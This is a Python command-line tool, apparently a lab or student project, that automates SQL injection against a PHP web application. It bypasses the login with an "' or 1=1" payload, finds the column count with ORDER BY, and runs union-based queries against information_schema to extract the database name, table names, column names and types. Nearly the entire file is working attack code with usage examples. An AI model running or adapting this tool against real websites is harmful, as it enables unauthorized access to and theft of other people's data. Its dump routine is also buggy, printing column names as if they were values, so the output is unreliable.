import requests
import getopt
import sys
import time
import hashlib
from bs4 import BeautifulSoup
import datetime

TARGET = ""
URL = ""
DOMAIN = ""
DATABASE = False
TABLE = False
DUMP = False
SESSION = ""
TOTAL_COL = 0
DUMP_URL = ""
DBNAME = ""
TABLES = ""
TIMESTAMPS = 0

def sqlinject():
    global DOMAIN, TARGET, SESSION
    login_action = 'http://' + TARGET + '/auth/auth.php'
    print('[*] Try login the website using SQL Injection Attack')
    print('')
    SESSION = requests.Session()
    page = SESSION.get(DOMAIN)
    soup = BeautifulSoup(page.text, 'html.parser')
    token = soup.find('input',{'name' : 'csrf_token'})['value']
    action = soup.find('input',{'name': 'action'})['value']
    # print(token)
    username = "\' or 1=1 limit 1#"
    password = "admin"
    payload = {
        'action' : action,
        'csrf_token' : token,
        'username' : username,
        'password' : password
    }
    response = SESSION.post(login_action, data=payload)
    cookie = requests.utils.dict_from_cookiejar(SESSION.cookies)['PHPSESSID']
    if response.url != DOMAIN:
        print("[+] The website is vulnerable to SQL Injection Attack. ")
        print(f"[+] Successfully getting the website authentication with PHPSESSID value {cookie}")
        print('')
    else:
        print("[-] Failed to get authentication")
        print('')
    
    
def getTotalColumn():
    global DOMAIN, SESSION, TOTAL_COL
    print("[+] Generate total column for union-based SQL Injection Attack")
    temp = DOMAIN + " ORDER BY {}"
    # print(temp)
    counter = 1
    startTime = time.time()
    while True:
        totalTime = time.time() - startTime
        if totalTime > 10:
            print(f'[-] Processed for {totalTime} seconds and not able to determine the total column. ')
            print('[-] The target URL is not vulnerable to union-based SQL Injection Attack')
            break
        format_url = temp.format(counter)
        web_home = SESSION.get(format_url)
        # format_response = requests.get(web_home)
        format_obj = BeautifulSoup(web_home.text,'html.parser')
        # print(format_obj)
        comments = format_obj.find('div',{'class':'box'})
        # print(comments)
        if comments is None:
            TOTAL_COL = counter - 1
            # print(total_col)
            break
        counter = counter + 1
    if totalTime < 10:
        print(f'[+] Launch union-based SQL Injection Attack at URL {DOMAIN}')
        # print(TOTAL_COL)

def unionbased():
    global DOMAIN, TOTAL_COL, DUMP_URL
    DUMP_URL = DOMAIN + " UNION SELECT "
    for i in range(1, TOTAL_COL + 1):
        DUMP_URL = DUMP_URL + str(i)
        if i != TOTAL_COL:
            DUMP_URL = DUMP_URL + ','
    # print(DUMP_URL)

def displaydb():
    global DUMP_URL, SESSION, DBNAME
    # print('[+] Show the requested result')
    # print(DUMP_URL)
    database_url = DUMP_URL.replace(',4',',DATABASE()')
    # print(database_url)
    database_web = SESSION.get(database_url)
    # print(database_web)
    database_soup = BeautifulSoup(database_web.text,'html.parser')
    #print(database_soup)
    contents = database_soup.findAll('div',{'class':'box-body'})
    # print(contents[-1])
    DBNAME = contents[-1].find('b',{'class':'text-blue'})
    print('')
    return DBNAME.text.strip()

def timestamp():
    global DUMP_URL, SESSION, TIMESTAMPS
    timestamp_url = DUMP_URL.replace(',4',',@@TIMESTAMP')
    # print(timestamp_url)
    timestamp_web = SESSION.get(timestamp_url)
    timestamp_soup = BeautifulSoup(timestamp_web.text,'html.parser')
    contents = timestamp_soup.findAll('div',{'class':'box-body'})
    rcvtimestamp = contents[-1].find('b',{'class':'text-blue'})
    rcvtimestamp = rcvtimestamp.text.strip()
    rcvtimestamp = round(float(rcvtimestamp))
    TIMESTAMPS = datetime.datetime.fromtimestamp(rcvtimestamp).isoformat()
    # print(ts)

def displaytc():
    global DBNAME, SESSION, DUMP_URL,TABLES
    # print(DBNAME)
    tables_url = DUMP_URL + f" FROM information_schema.tables WHERE table_schema ='" + DBNAME +"'"
    tables_url = tables_url.replace(',4',',group_concat(table_name)')
    # print(tables_url)
    tables_web = SESSION.get(tables_url)
    tables_soup = BeautifulSoup(tables_web.text,'html.parser')
    # print(tables_soup)
    contents = tables_soup.findAll('div',{'class':'box-body'})
    # print(contents[-1])
    TABLES = contents[-1].find('b',{'class':'text-blue'})
    TABLES = TABLES.text.strip().split(',')
    # print(TABLES)
    return TABLES

def printColumnsName():
    global DBNAME, SESSION, DUMP_URL, TABLES
    i = 1
    for table in TABLES:
        table = table.strip()
        columns_url = DUMP_URL + f" FROM information_schema.columns WHERE table_schema ='" + DBNAME +"'"
        # print(columns_url)
        columns_url = columns_url + " AND table_name ='" + table +"'"
        columns_url = columns_url.replace(',4',',group_concat(column_name)')
        # print(columns_url)
        columns_web = SESSION.get(columns_url)
        columns_soup = BeautifulSoup(columns_web.text,'html.parser')
        # print(columns_soup)
        contents = columns_soup.findAll('div',{'class':'box-body'})
        columns = contents[-1].find('b',{'class':'text-blue'})
        columns = columns.text.strip().split(',')
        print(f'[{i} column(s)]')
        print("+----------------+")
        print("| Column Name    |")
        print("+----------------+")
        for column in columns:
            print(f'|{column}')
        print('\n') 
        i = i + 1
        print("+-------------+")

def printColumnsType():
    global DBNAME, SESSION, DUMP_URL, TABLES
    i = 1
    for table in TABLES:
        table = table.strip()
        columns_url = DUMP_URL + f" FROM information_schema.columns WHERE table_schema ='" + DBNAME +"'"
        # print(columns_url)
        columns_url = columns_url + " AND table_name ='" + table +"'"
        columns_url = columns_url.replace(',4',',group_concat(column_type)')
        # print(columns_url)
        columns_web = SESSION.get(columns_url)
        columns_soup = BeautifulSoup(columns_web.text,'html.parser')
        # print(columns_soup)
        contents = columns_soup.findAll('div',{'class':'box-body'})
        columns = contents[-1].find('b',{'class':'text-blue'})
        columns = columns.text.strip().split(',')
        print(f'[{i} column(s)]')
        print("+-------------+")
        print("| Data Type   |")
        print("+-------------+")
        for column in columns:
            print(f'|{column}')
        print('\n') 
        i = i + 1
        print("+-------------+")
              
def displaydumb():
    global DOMAIN, TABLES, SESSION, DBNAME, DUMP_URL
    # print(TABLES)
    columns_url = DUMP_URL + f" FROM information_schema.columns WHERE table_schema ='" + DBNAME +"'"
    # print(columns_url)
    columns_url = columns_url + " AND table_name ='" + TABLES[0] +"'"
    columns_url = columns_url.replace(',4',',group_concat(column_name)')
    #print(url)
    content_web = SESSION.get(columns_url)
    content_soup = BeautifulSoup(content_web.text,'html.parser')
    # print(content_soup)
    contents = content_soup.findAll('div',{'class':'box-body'})
    dumps = contents[-1].find('b',{'class':'text-blue'})
    dumps = dumps.text.strip().split(',')
    # print(dumps)
    # print(f'[{total} column(s)]')
    for content in dumps:
        print(f'Column Name : {content}')
        print(f'Column Value: {content}')

def help():
    print('Usage: beo.py [-t/--target IP_Address/DNS] [-u/--url URL] [OPTIONS]')
    print('')
    print(' -h, --help                                       Show basic help message and exit')
    print(' -t, IP_Address/DNS, --target=IP_Address/DNS      Set IP Address or DNS (e.g 127.0.0.1')
    print(' -u URL, --url=URL                                Set website URL (e.g web/index.php?=1')
    print('')
    print('Options')
    print(' -db                                              Show the current database name')
    print(' -tc                                              Show all tables name, table create time and columns from current database')
    print(' -dump                                            Show all table name and entries data from the current database')
    print('')
    print('Example')
    print('beo.py -h')
    print('beo.py --help')    
    print('beo.py -t 127.0.0.1 -u web/index.php?=1 --db')
    print('beo.py --target 127.0.0.1 -url web/index.php?=1 --db')
    print('beo.py -t 127.0.0.1 -u web/index.php?=1 --tc')
    print('beo.py --target 127.0.0.1 -url web/index.php?=1 --tc')
    print('beo.py -t 127.0.0.1 -u web/index.php?=1 --dump')
    print('beo.py --target 127.0.0.1 -url web/index.php?=1 --dump')
    print('beo.py -t 127.0.0.1 -u web/index.php?=1 --db --tc --dump')
    print('beo.py --target 127.0.0.1 -url web/index.php?=1 --db --tc --dump')

def main():
    global URL, TARGET, DATABASE, TABLE, DUMP, DOMAIN, DUMP_URL, SESSION, DBNAME
    if not len(sys.argv[1:]):
        help()
    try:
        args, _ = getopt.getopt(sys.argv[1:],"t:u:d a m",['target=','url=','db','tc','dump'])
    except getopt.GetoptError as err:
        print(str(err))
    try:
        for key, value in args:
            if key == '-t' or key == '--target':
                TARGET = value
            if key == '-u' or key == '--url':
                URL = value
            if key == '-h' or key == '--help':
                help()
                return
            if key == '-d' or key == '--db':
                DATABASE = True
            if key == '-a' or key == '--tc':
                TABLE = True
            if key == '-m' or key == '--dump':
                DUMP = True
        if TARGET != "" and URL != "":
            DOMAIN = 'http://' + TARGET + '/' + URL
            # print(DOMAIN)
            try:
                response = requests.get(DOMAIN,timeout=1)
                response.raise_for_status()
            except:
                pass
            if response.status_code != 200:
                print('[-] The requested URL not found')
            else:
                sqlinject()
                getTotalColumn()
            print('[+] Show the requested result')
            if DATABASE == True:
                unionbased()
                # print(DUMP_URL)
                union_web  = SESSION.get(DUMP_URL)
                # print(union_web)
                union_obj = BeautifulSoup(union_web.text,'html.parser')
                # print(union_obj)
                displaydb()
                print(f'Database Name: {DBNAME.text.strip()}')
            if TABLE == True:
                unionbased()
                DBNAME = displaydb()
                displaytc()
                timestamp()
                for table in TABLES:
                    print('')
                    print('========================================')
                    print('')
                    print(f'Table Name : {table}')
                    print('')
                    print(f'Table Create Time: {TIMESTAMPS}')
                    print('')
                    printColumnsName()
                    printColumnsType()
                    print('========================================')
            if DUMP == True:
                unionbased()
                DBNAME = displaydb()
                displaytc()
                for table in TABLES:
                    print('')
                    print('========================================')
                    print('')
                    print(f'Table Name : {table}')
                    print('')
                    displaydumb()
                    print('========================================')
        elif DATABASE == True or TABLE == True or DUMP == True:
            print('-t/--target or -u/--url argument is required')
        else:
            sys.exit()
    except:
        help()
        
if __name__ == "__main__":
    main()

